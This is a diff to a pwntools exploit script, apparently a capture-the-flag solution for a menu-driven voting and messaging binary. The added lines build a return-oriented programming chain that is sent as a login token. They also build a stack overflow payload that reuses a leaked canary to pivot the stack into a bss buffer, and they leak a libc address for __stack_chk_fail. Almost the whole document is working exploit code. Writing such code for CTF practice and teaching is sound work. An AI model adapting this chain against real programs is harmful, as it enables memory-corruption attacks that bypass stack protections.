@@ -44,11 +44,25 @@ base = libc_csu_init - 0x1140
 
 offset_from_msg_to_canary = 0xde28 - 0xdd40
 
+puts_plt = base + 0x940
+stack_chk_fail_got = base + 0x201f98
+pop_rdi = base + 0x11a3
+main = base + 0xffb
+leave_ret = base + 0xbe9
+buf = base + 0x202160
+
+rop = flat(p64(buf + 32),
+         p64(pop_rdi),
+         p64(stack_chk_fail_got),
+         p64(puts_plt),
+         p64(leave_ret),
+         p64(main))
+
 for j in range(25):
     r.sendlineafter('>', '2')  # register
-    r.sendlineafter('Register an anonymous token: ', 'jason')
+    r.sendlineafter('Register an anonymous token: ', rop)
     r.sendlineafter('>', '1')  # login
-    r.sendlineafter('Token: ', 'jason')
+    r.sendlineafter('Token: ', rop)
 
 # vote
     for i in range(10):
@@ -58,9 +72,9 @@ for j in range(25):
     r.sendlineafter('>', '3') # logout
 
 r.sendlineafter('>', '2')  # register
-r.sendlineafter('Register an anonymous token: ', 'jason')
+r.sendlineafter('Register an anonymous token: ', rop)
 r.sendlineafter('>', '1')  # login
-r.sendlineafter('Token: ', 'jason')
+r.sendlineafter('Token: ', rop)
 
 # vote
 for i in range(5):
@@ -70,22 +84,25 @@ for i in range(5):
 r.sendlineafter('>', '3') # logout
 
 r.sendlineafter('>', '1')
-r.sendlineafter('Token: ', 'jason')
+r.sendlineafter('Token: ', rop)
 r.sendlineafter('>', '2') # say something
 r.sendlineafter(': ', '0') # to pusheen
 
 # overflow rbp to 0x202230, return address to "leave ret" -> 0xbe9
-bss = base + 0x202230
-leave_ret = base + 0xbe9
 payload = flat('b' * offset_from_msg_to_canary,
                p64(canary),
-               p64(base),
+               p64(buf),
                p64(leave_ret)
                )
 
-# r.sendlineafter('Message: ', 'b' * offset_from_msg_to_canary + p64(canary) + 'b' * 8 + p64(0xdeadbeef)) # to pusheen
 r.sendlineafter('Message: ', payload) # to pusheen
-# success('message sent')
-# r.sendlineafter('>', '3')
+r.sendlineafter('>', '3')
+
+r.recvuntil('>')
+r.recvline()
+stack_chk_fail_libc = u64(r.recv(6) + '\0\0')
+success("leaked stack_chk_fail@libc: {}".format(hex(stack_chk_fail_libc)))
+
 r.interactive()
+
 
